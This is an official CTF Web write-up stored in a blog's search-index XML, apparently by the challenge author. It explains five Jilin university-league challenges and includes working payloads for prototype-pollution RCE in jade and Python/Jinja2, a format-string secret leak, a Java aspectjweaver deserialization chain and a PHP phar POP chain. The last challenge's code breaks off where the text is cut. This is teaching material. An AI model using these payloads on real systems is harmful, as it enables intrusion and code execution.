<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>吉林省高校网络安全联赛第三轮 Web 官方题解</title>
    <url>/2024/02/08/%E5%90%89%E6%9E%97%E7%9C%81%E7%AC%AC%E4%B8%89%E8%BD%AE%E8%81%94%E8%B5%9B-Web/</url>
    <content><![CDATA[
  <div class="note p-4 mb-4 rounded-small primary">
    <p>负责了Web和Misc方向的题目设计，这里记录一下本次Web方向的题解。</p>

  </div>

<h2 id="华容道"><a href="#华容道" class="headerlink" title="华容道"></a>华容道</h2><blockquote>
<p>难度：签到</p>
<p>考点：js 前端代码基础</p>
</blockquote>
<p>这题是一个使用 vue 写的前端小游戏，需要将大的正方形方块移动到指定位置获取胜利。修改了 <a class="link"   href="https://conwnet.github.io/huarongdao/" >https://conwnet.github.io/huarongdao/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>  这个项目，选用了其中 “峰回路转” 这个布局，额外添加了胜利之后在界面上显示flag内容。</p>
<h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><p>直接搜索布局解法，由于使用的布局是经典布局，虽然比较难，但是在互联网上是存在对应解法的。</p>
<h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p>根据逻辑，一般js小游戏都会有一个判断胜利的条件，尝试搜索 “win”，”success” 等关键字，可以发现存在如下内容：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">t.default = &#123;</span><br><span class="line">          components: &#123;</span><br><span class="line">              Grid: i.default</span><br><span class="line">          &#125;,</span><br><span class="line">          props: [&quot;unitSize&quot;, &quot;layout&quot;],</span><br><span class="line">          data: function () &#123;</span><br><span class="line">              return &#123;</span><br><span class="line">                  state: this.layout,</span><br><span class="line">                  answer: [],</span><br><span class="line">                  thinking: !1</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;,</span><br><span class="line">          computed: &#123;</span><br><span class="line">              width: function () &#123;</span><br><span class="line">                  return 4 * this.unitSize</span><br><span class="line">              &#125;,</span><br><span class="line">              height: function () &#123;</span><br><span class="line">                  return 5.5 * this.unitSize</span><br><span class="line">              &#125;,</span><br><span class="line">              success: function () &#123;</span><br><span class="line">                  return &quot;5&quot; === this.state[13]</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;,</span><br><span class="line">          </span><br><span class="line"> 			.........</span><br></pre></td></tr></table></figure></div>

<p>每次网格中的矩形发生变化时，就会计算当前的 this.state[13] 是否为 “5” （实际上仔细读代码能知道 this.state[13] 即为出口位置，”5”是大方块的一个表示，也即判断当前大方块是否在出口位置），我们可以尝试修改其值为true，并再移动一次方块即可获取flag内容。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240207232013352.png"
                      alt="image-20240207232013352"
                ></p>
<h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><blockquote>
<p>难度：简单</p>
<p>考点：jade原型链污染</p>
</blockquote>
<p>题目给出了 app.js 源码 和 package.json 文件</p>
<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> jade = <span class="built_in">require</span>(<span class="string">&#x27;jade&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> jsYaml = <span class="built_in">require</span>(<span class="string">&#x27;js-yaml&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, __dirname);</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&quot;view engine&quot;</span>, <span class="string">&quot;jade&quot;</span>);</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(<span class="string">&#x27;public&#x27;</span>));</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">text</span>(&#123; <span class="attr">type</span>: <span class="string">&#x27;application/x-yaml&#x27;</span> &#125;));</span><br><span class="line"><span class="keyword">let</span> words = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&quot;index.jade&quot;</span>, &#123;</span><br><span class="line">        <span class="attr">datas</span>: words</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/record&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(req.<span class="property">body</span>)&#123;</span><br><span class="line">        <span class="title function_">merge</span>(words, jsYaml.<span class="title function_">load</span>(req.<span class="property">body</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;success&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Server is running on http://localhost:3000`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div>

<p>很明显存在 jade 原型链污染，但是数据解析使用的是自定义的 ‘application&#x2F;x-yaml’ 形式，使用yaml解析器来解析yaml数据，所以需要将传统的json格式转为yaml格式即可。</p>
<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a><strong>payload</strong></h3><p><strong>POST</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">__proto__:</span><br><span class="line">  self: 1</span><br><span class="line">  line: global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;cat /flag &gt; ./public/1.txt&#x27;)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240207233651306.png"
                      alt="image-20240207233651306"
                ></p>
<p>之后刷新一下首页，再去访问 &#x2F;1.txt 即可获得flag内容</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240207233825782.png"
                      alt="image-20240207233825782"
                ></p>
<h2 id="My-Profile"><a href="#My-Profile" class="headerlink" title="My Profile"></a>My Profile</h2><blockquote>
<p>难度：简单</p>
<p>考点：python 格式化字符串漏洞，python 原型链污染</p>
</blockquote>
<p>通过查看首页源码，发现存在注释内容</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- /g3ts0uRce 接口记得删除 --&gt;</span><br></pre></td></tr></table></figure></div>

<p>访问该接口可以获取源码。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, session</span><br><span class="line"><span class="keyword">from</span> koishi_secret <span class="keyword">import</span> secret</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = secret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyUser</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age, info</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line">        self.info = info</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;用户信息&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                update(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            update(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">instance = MyUser(<span class="string">&quot;阿卡林&quot;</span>, <span class="string">&quot;今年刚满18&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    is_change = <span class="literal">False</span></span><br><span class="line">    data = &#123;&#125;</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        is_change = <span class="literal">True</span></span><br><span class="line">        data = json.loads(request.data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&quot;role&quot;</span>) == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        data[<span class="string">&quot;info&quot;</span>] = <span class="string">&quot;修改成功&quot;</span></span><br><span class="line">        update(data, instance)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            name = data[<span class="string">&quot;name&quot;</span>]</span><br><span class="line">            <span class="keyword">if</span> name != <span class="string">&quot;&quot;</span>:</span><br><span class="line">                instance.name = name</span><br><span class="line">        <span class="keyword">except</span> KeyError:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            age = data[<span class="string">&quot;age&quot;</span>]</span><br><span class="line">            <span class="keyword">if</span> age != <span class="string">&quot;&quot;</span>:</span><br><span class="line">                instance.age = age</span><br><span class="line">        <span class="keyword">except</span> KeyError:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> is_change:</span><br><span class="line">            info = <span class="string">&quot; *修改&#123;0&#125;成功（&quot;</span> + <span class="string">&quot;姓名：&quot;</span> + instance.name + <span class="string">&quot;; 年龄：&quot;</span> + instance.age + <span class="string">&quot;岁）&quot;</span></span><br><span class="line">            instance.info = info.<span class="built_in">format</span>(instance)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, user=instance)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">5000</span>)</span><br></pre></td></tr></table></figure></div>

<p>通过上面的源码可以发现，update函数存在原型链污染问题，但是需要我们 role 为 admin，而 koishi_secret 文件中的 secret 无法直接获取。但是在渲染前可以发现format内容可控，存在格式化字符串问题，可以通过此处获取全局变量进而获取 secret 内容。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;0.__class__.__init__.__globals__&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240207232751157.png"
                      alt="image-20240207232751157"
                ></p>
<p>拿到密钥后即可伪造任意用户，再传入原型链内容即可。</p>
<h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><p><strong>POST</strong></p>
<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="code"><pre><span class="line">Cookie<span class="punctuation">:</span> session=eyJyb2xlIjoiYWRtaW4ifQ.Zbcjzg.Fq7AIofnOt_VHZnZWB6IrV7oNBs</span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;__loader__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;sys&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">              <span class="attr">&quot;modules&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;jinja2&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                  <span class="attr">&quot;runtime&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;exported&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;*;__import__(&#x27;os&#x27;).system(&#x27;/readflag &gt;./static/1.txt&#x27;);#&quot;</span><span class="punctuation">]</span></span><br><span class="line">                  <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">              <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">          <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>然后直接访问 &#x2F;static&#x2F;1.txt 路由即可获取flag。</p>
<h2 id="ezjava"><a href="#ezjava" class="headerlink" title="ezjava"></a>ezjava</h2><blockquote>
<p>难度：中等偏易</p>
<p>考点：软链接，java反序列化</p>
</blockquote>
<p>题目附件给出了jar文件，反编译后查看源码，发现存在两个路由 &#x2F;upload 和 &#x2F;auth&#x2F;backdoor，而 &#x2F;upload 主要将上传的文件进行了解压操作， &#x2F;auth&#x2F;backdoor 则是常见的反序列化操作。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240207234133284.png"
                      alt="image-20240207234133284"
                ></p>
<p>除此以外，还存在一个拦截器，每次访问 &#x2F;auth&#x2F;** 路由时，会读取 &#x2F;app&#x2F;security.txt 文件进行校验。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240207234456175.png"
                      alt="image-20240207234456175"
                ></p>
<p>因此我们要反序列化，首先要去通过解压处使用软链接读密钥文件内容：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240207234854801.png"
                      alt="image-20240207234854801"
                ></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">HaHaHaThisisMySecretFile</span><br></pre></td></tr></table></figure></div>

<p>有这个key之后，我们就可以进行反序列化了。</p>
<p>反序列化黑名单如下，我们基本上限制死了直接执行命令的方式。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240207235011414.png"
                      alt="image-20240207235011414"
                ></p>
<p>查看依赖中有 freemaker 和 aspectjweaver，所以我们可以修改首页内容进行模板注入。</p>
<p>随后打一个反序列化即可写文件，再访问首页即可</p>
<h3 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Class clazz = Class.forName(&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;);</span><br><span class="line">      Constructor declaredConstructor = clazz.getDeclaredConstructor(String.class,int.class);</span><br><span class="line">      declaredConstructor.setAccessible(true);</span><br><span class="line">      HashMap map = (HashMap)declaredConstructor.newInstance(&quot;/app/templates/&quot;, 114514);</span><br><span class="line">      ConstantTransformer constantTransformer = new ConstantTransformer(&quot;koishi_test!!!&quot;.getBytes(StandardCharsets.UTF_8));</span><br><span class="line">      Map outerMap = LazyMap.decorate(map,constantTransformer);</span><br><span class="line">      TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap,&quot;index.ftl&quot;);</span><br><span class="line">      HashSet hashSet = new LinkedHashSet(1);</span><br><span class="line">      hashSet.add(tiedMapEntry);</span><br><span class="line">      outerMap.remove(&quot;index.ftl&quot;);</span><br><span class="line">      byte[] bytes = SerializerUtil.objectByteSerialize(hashSet);</span><br><span class="line">      System.out.println(URLEncoder.encode(Base64.getEncoder().encodeToString(bytes)));</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240208000350430.png"
                      alt="image-20240208000350430"
                ></p>
<h2 id="FileCheck"><a href="#FileCheck" class="headerlink" title="FileCheck"></a>FileCheck</h2><blockquote>
<p>难度：中等</p>
<p>考点：phar 反序列化，黑、白名单绕过，PHP 源码泄露漏洞</p>
</blockquote>
<p>进入首页，发现没有任何突破口，抓包发现服务版本为 <code>X-Powered-By: PHP/7.4.21</code> 可以去读取源码</p>
<p>首先抓校验文件的请求，读取list.php</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240208001024984.png"
                      alt="image-20240208001024984"
                ></p>
<p>发现其中包含了 class.php</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Neepu</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$n</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ne</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nee</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;n-&gt;n);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ne-&gt;<span class="title function_ invoke__">ne</span>(<span class="variable">$this</span>-&gt;nee);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;n = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Koishi</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$kk</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ii</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ss</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;kk !== <span class="variable language_">$this</span>-&gt;ii) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;kk) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;ii)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;kk)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;ii)) )&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;ss-&gt;ss = <span class="string">&quot;happy newYear&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;I&#x27;m Ko1sh1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shruti</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$r</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;r-&gt;u)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;ok, empty&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;nothing todo&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;I&#x27;m Shruti&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NewYear</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$date</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nYear</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^\d&#123;4&#125;-\d&#123;2&#125;-\d&#123;2&#125;$/&quot;</span>, <span class="variable">$this</span>-&gt;nYear)) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;date = <span class="title function_ invoke__">date</span>(<span class="string">&quot;Y-m-d&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$arguments</span>)) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$arguments</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/s|o|l|e/m&quot;</span>, <span class="variable">$value</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&quot;no, bro!&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$value</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/s|o|l|e/m&quot;</span>, <span class="variable">$arguments</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;no, bro!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;距离新年还有：&quot;</span> . <span class="title function_ invoke__">ceil</span>((<span class="title function_ invoke__">strtotime</span>(<span class="string">&quot;2024-02-10&quot;</span>) - <span class="title function_ invoke__">strtotime</span>(<span class="title function_ invoke__">date</span>(<span class="string">&quot;Y-m-d&quot;</span>))) / <span class="number">86400</span>) . <span class="string">&quot; 天&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Obsolescent</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$o</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">noWay</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&#x27;/readflag&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;o-&gt;o) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;o = <span class="variable">$value</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>发现起可以执行&#x2F;readflag去读取flag，可以构造pop链。</p>
<p>但此时不存在反序列化的地方，注意到 list.php  调用了 <code>mime_content_type</code> 函数，所以我们可以尝试phar反序列化。</p>
<p>此外还需要注意一个地方，上传之后的文件校验了是否为图片文件，而且在写入的时候添加了部分内容：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="comment">//    ini_set(&#x27;open_basedir&#x27;, &#x27;./uploads/&#x27;);</span></span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] == <span class="string">&quot;POST&quot;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>])) &#123;</span><br><span class="line">       <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">       <span class="variable">$fileTmpName</span> = <span class="variable">$file</span>[<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">       <span class="variable">$fileError</span> = <span class="variable">$file</span>[<span class="string">&quot;error&quot;</span>];</span><br><span class="line">       <span class="comment">// 获取文件相关信息</span></span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] == <span class="number">0</span>)&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&lt;h1 style=&#x27;color: red&#x27;&gt;No file selected&lt;/h1&gt;&lt;/center&gt;&quot;</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">else</span> <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span 